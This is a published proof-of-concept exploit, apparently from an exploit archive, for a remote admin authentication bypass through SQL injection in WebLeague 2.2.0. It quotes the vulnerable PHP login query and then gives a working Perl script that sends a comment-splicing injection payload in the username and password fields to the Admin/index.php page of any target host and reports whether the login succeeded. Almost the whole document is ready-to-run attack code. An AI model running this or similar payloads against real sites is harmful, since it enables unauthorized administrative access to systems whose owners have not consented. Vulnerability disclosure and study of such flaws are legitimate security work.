webLeague 2.2.0 (Auth Bypass) Remote SQL Injection Exploit
==========================================================


#!/usr/bin/perl -W
#
# WebLeague 2.2.0 Remote Admin Bypass p0c
# written by ka0x 
#
# need magic_quotes_gpc = Off
#
# Vuln code (Admin/index.php) :
#
# 10:	$sql="SELECT * FROM $admintable WHERE name = &#039;$_POST[username]&#039; AND password = &#039;$_POST[password]&#039;"; // ---> NOT CLEAN $_POST VARS
# 11:	$result=mysql_query($sql,$db);
# 12:	$number = mysql_num_rows($result);
# 13:	if ($number == "1") {
#

use LWP::UserAgent ;

my $timeout = 10 ;

die "* USAGE: \tperl $0 <host>\n" unless $ARGV[0] ;

my $host = $ARGV[0] ;

$host = &#039;http://&#039;.$host if( $host !~ /^http:/ ) ;
$host = $host.&#039;/&#039; unless( substr( $host, -1 ) eq &#039;/&#039; ) ;

my $ua = LWP::UserAgent->new() or die;
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008072820 Firefox/3.0.1") ;
$ua->timeout( $timeout ) ;

my $req = HTTP::Request->new( POST => $host.&#039;Admin/index.php&#039; );
$req->content_type( &#039;application/x-www-form-urlencoded&#039; ) ;
$req->content( &#039;username=\&#039;/*&password=*/ or \&#039;\&#039;=\&#039;&#039; ) ; 	# content $_POST vars: 
								# username=  &#039;/*
								# password=   */ or &#039;&#039;=&#039;
my $res = $ua->request( $req ) ;

if( $res->content =~ /You are logged in as/i ){
	print "[+] The website is vulnerable." ;
} 
else {
	print "[-] The website isn&#039;t vulnerable." ;
}




